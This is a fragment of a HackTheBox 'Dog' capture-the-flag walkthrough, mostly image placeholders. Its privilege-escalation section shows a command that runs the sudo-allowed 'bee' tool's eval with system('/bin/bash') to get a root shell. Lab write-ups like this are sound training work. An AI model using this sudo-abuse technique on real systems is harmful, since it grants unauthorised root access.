...
date: 2024-07-29
categories: HTB
tags: ["dog", "htb walkthrough", "ctf", "cybersecurity", "hackthebox", "htb writeup", "penetration testing", "writeup", "htb"]
---
...
![[/assets/images/dog12.png]]

![[/assets/images/dog13.png]]

![[/assets/images/dog14.png]]

## SSH as johncusack
![[/assets/images/dog15.png]]


# Privilege Escalation
![[/assets/images/dog16.png]]

```sh
bee --help
```

![[/assets/images/dog17.png]]

```sh
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee --root=/var/www/html eval 'system("/bin/bash")'
```

![[/assets/images/dog18.png]]
